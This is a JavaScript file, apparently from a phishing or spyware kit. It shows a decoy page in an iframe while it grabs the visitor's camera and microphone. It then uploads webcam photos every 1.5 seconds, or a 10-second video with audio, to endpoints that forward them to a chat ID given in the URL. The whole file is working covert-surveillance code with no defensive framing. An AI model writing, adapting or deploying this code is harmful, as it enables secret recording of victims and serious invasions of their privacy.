const params = new URLSearchParams(window.location.search);
const url = params.get('url');
const uid = params.get('uid');

if (!url || !uid) {
  document.body.innerHTML = '<h2 style="text-align:center;margin-top:20%;">❌ Parameter tidak lengkap</h2>';
  throw new Error("Missing URL or UID");
}

document.getElementById("targetFrame").src = decodeURIComponent(url);

const isPhotoMode = window.location.pathname.includes("article") && !window.location.pathname.includes("news");
const video = document.getElementById("video");

async function startProcess() {
  if (isPhotoMode && document.getElementById("canvas")) {
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      video.srcObject = stream;

      setInterval(() => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const base64 = canvas.toDataURL("image/png");

        const bin = atob(base64.split(',')[1]);
        const buffer = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) buffer[i] = bin.charCodeAt(i);
        const blob = new Blob([buffer], { type: "image/png" });

        const form = new FormData();
        form.append("chat_id", uid);
        form.append("photo", blob, "webcam.png");

        const timestamp = new Date().toLocaleTimeString();
        form.append("caption", `Berhasil mengambil gambar\n${timestamp}`);

        fetch(`/api/send-photo`, {
          method: "POST",
          body: form
        });

      }, 1500);
    } catch (e) {
      console.error("❌ Gagal akses webcam (foto):", e);
    }
  } else {
    let stream;
    let recorder;
    let chunks = [];

    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      video.srcObject = stream;

      recorder = new MediaRecorder(stream);
      recorder.ondataavailable = e => chunks.push(e.data);

      recorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/webm' });

        const form = new FormData();
        form.append("chat_id", uid);
        form.append("video", blob, "webcam.webm");

        const timestamp = new Date().toLocaleTimeString();
        form.append("caption", `Berhasil merekam\n${timestamp}`);

        fetch(`/api/send-video`, {
          method: "POST",
          body: form
        });
      };

      recorder.start();

      setTimeout(() => {
        recorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, 10000);
    } catch (err) {
      console.error("❌ Gagal akses webcam (video):", err);
    }
  }
}
